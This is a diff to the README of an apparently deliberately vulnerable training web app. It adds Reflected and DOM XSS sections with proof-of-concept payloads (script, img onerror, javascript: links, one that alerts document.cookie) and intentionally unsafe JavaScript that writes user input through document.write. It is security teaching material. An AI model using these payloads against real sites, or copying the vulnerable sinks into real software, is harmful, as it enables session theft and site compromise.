@@ -28,9 +28,10 @@ brief description for some of the vulnerabilities (but not all of them)
 Semgrep scan is: SemgrepSAST.txt
 
 ## XSS
+##### Reflected XSS
 Exploit/PoC:
 ```html
-1. GET injection: http://{URL}/xss?param=<script>alert(1)</script>
+1. GET injection: http://{URL}/xss/reflected?param=<script>alert(1)</script>
 2. HTML img injection: <img src=https://stackoverflow.com/ onerror=alert(1)>
 3. JS  injection: <script>alert(document.domain)</script>
 4. HTML tag injection: <a href="javascript:alert(document.domain);">click here</a>
@@ -66,7 +67,52 @@ user_input = request.args.get('param') #<-- точка ввода через que
 return render_template('xss.html', user_input=user_input) #<-- небезопасный вывод пользователю данных без санитизации
 data = request.form['user_input'] #<-- точка пользовательского ввода без валидации xss stored
 ```
+##### DOM XSS
+<b>Task 1</b>
+Exploit/PoC:
+```js
+// DevTools
+document.write('<p>Hello, ' + '<img src=x onerror=alert("cookie:"+document.cookie)>' + '! You visited this page.</p>')
+```
 
+Vulnerable code:
+```js
+window.onload = function() {
+  var form = document.getElementById('myForm');
+  form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  // Vulnerable source *.getElementById('nameInput').value
+  var userInput = document.getElementById('nameInput').value;
+  // Vulnerable sink *.write with unsanitized input
+  document.write('<p>Hello, ' + userInput + '! You visited this page.</p>');
+  });
+};
+```
+
+<b>Task 2</b>
+Exploit/PoC:
+```
+TBA
+```
+
+Vulnerable code:
+```
+// Vulnerable source location.search + get
+var hidden = (new URLSearchParams(window.location.search)).get('testMe');
+// Vulnerable sink document.write
+if(hidden){document.write('<p>'+hidden+'</p>');}
+```
+
+<b>Task 3</b>
+Exploit/PoC:
+```
+TBA
+```
+
+Vulnerable code:
+```
+TBA
+```
 ## Authentication bypass
 Exploit/PoC:
 ```
